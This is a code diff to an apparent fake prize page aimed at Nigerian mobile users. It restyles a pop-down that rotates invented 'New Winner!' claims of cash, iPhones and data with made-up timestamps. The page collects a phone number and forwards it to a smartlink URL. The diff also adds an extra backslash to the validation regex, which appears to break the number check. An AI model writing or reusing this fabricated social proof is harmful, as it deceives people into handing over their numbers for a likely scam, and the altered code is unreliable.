@@ -12,6 +12,45 @@
       margin: 0;
       padding: 0;
     }
+    /* ===== Testimonial Pop-Down ===== */
+    .testimonial-pop {
+      position: fixed;
+      top: -150px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: linear-gradient(135deg, #ff4b2b, #ff416c);
+      color: #fff;
+      padding: 15px 20px;
+      border-radius: 12px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.4);
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      width: 90%;
+      max-width: 400px;
+      transition: top 0.6s ease;
+      z-index: 2000;
+    }
+    .testimonial-pop.show {
+      top: 20px;
+    }
+    .testimonial-icon {
+      font-size: 28px;
+    }
+    .testimonial-text {
+      flex: 1;
+    }
+    .testimonial-text strong {
+      display: block;
+      font-size: 16px;
+      margin-bottom: 3px;
+    }
+    .testimonial-time {
+      font-size: 12px;
+      opacity: 0.8;
+      margin-top: 4px;
+    }
+    /* ===== Page styles ===== */
     .container {
       max-width: 500px;
       margin: 40px auto;
@@ -152,44 +191,17 @@
       margin-top: 20px;
       text-align: center;
     }
-
-    /* ===== POP-DOWN TESTIMONIAL ===== */
-    .testimonial-popup {
-      position: fixed;
-      top: -100px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: #1b1b1b;
-      color: #fff;
-      border-radius: 8px;
-      padding: 12px 18px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.5);
-      font-size: 14px;
-      z-index: 2000;
-      transition: top 0.5s ease;
-      border: 1px solid #ff4444;
-    }
-    .testimonial-popup.show {
-      top: 20px;
-    }
-    .testimonial-popup img {
-      width: 24px;
-      height: 24px;
-    }
-    .testimonial-text strong {
-      color: #ff4444;
-    }
   </style>
 </head>
 <body>
-
-  <!-- Testimonial Pop-down -->
-  <div id="testimonial" class="testimonial-popup">
-    <img src="https://cdn-icons-png.flaticon.com/512/4225/4225683.png" alt="gift"/>
-    <div class="testimonial-text"></div>
+  <!-- Testimonial Pop-Down -->
+  <div class="testimonial-pop" id="testimonialPop">
+    <div class="testimonial-icon">🎉</div>
+    <div class="testimonial-text">
+      <strong>New Winner!</strong>
+      <span id="testimonialMessage">James from Lagos just won ₦5,000,000!</span>
+      <div class="testimonial-time" id="testimonialTime">2 minutes ago</div>
+    </div>
   </div>
 
   <div class="container">
@@ -240,7 +252,7 @@
   <script>
     function startCheck() {
       const number = document.getElementById('msisdn').value;
-      if (!/^0[789][01]\d{8}$/.test(number)) {
+      if (!/^0[789][01]\\d{8}$/.test(number)) {
         alert('Please enter a valid 11-digit Nigerian number');
         return;
       }
@@ -274,27 +286,33 @@
       window.location.href = `https://your-smartlink.com/?msisdn=${number}`;
     }
 
-    // Testimonial popup rotation
+    // ===== Testimonial Rotation Logic =====
     const testimonials = [
-      "Aisha just won a <strong>20GB Data bundle</strong> for a year!",
-      "John from Lagos won a <strong>₦5 Million Cash Prize</strong>!",
-      "Chioma just received a brand new <strong>iPhone 14 Pro Max</strong>!",
-      "Emeka claimed <strong>Unlimited Data for 6 months</strong>!",
-      "Zainab from Abuja won a <strong>Luxury Car</strong>!"
+      { msg: "James from Lagos just won ₦5,000,000!", time: "2 minutes ago" },
+      { msg: "Ada from Abuja got a brand new iPhone 14 Pro Max!", time: "5 minutes ago" },
+      { msg: "Michael from Port Harcourt received unlimited data for 1 year!", time: "7 minutes ago" }
     ];
 
-    function showTestimonial(text) {
-      const popup = document.getElementById('testimonial');
-      popup.querySelector('.testimonial-text').innerHTML = text;
-      popup.classList.add('show');
-      setTimeout(() => popup.classList.remove('show'), 5000);
+    let tIndex = 0;
+    const testimonialPop = document.getElementById('testimonialPop');
+    const testimonialMessage = document.getElementById('testimonialMessage');
+    const testimonialTime = document.getElementById('testimonialTime');
+
+    function showTestimonial() {
+      const t = testimonials[tIndex];
+      testimonialMessage.textContent = t.msg;
+      testimonialTime.textContent = t.time;
+      testimonialPop.classList.add('show');
+
+      setTimeout(() => {
+        testimonialPop.classList.remove('show');
+      }, 4000); // Visible for 4s
+
+      tIndex = (tIndex + 1) % testimonials.length;
     }
 
-    let tIndex = 0;
-    setInterval(() => {
-      showTestimonial(testimonials[tIndex]);
-      tIndex = (tIndex + 1) % testimonials.length;
-    }, 8000);
+    setInterval(showTestimonial, 7000); // New testimonial every 7s
+    setTimeout(showTestimonial, 2000); // First one after 2s
   </script>
 </body>
 </html>
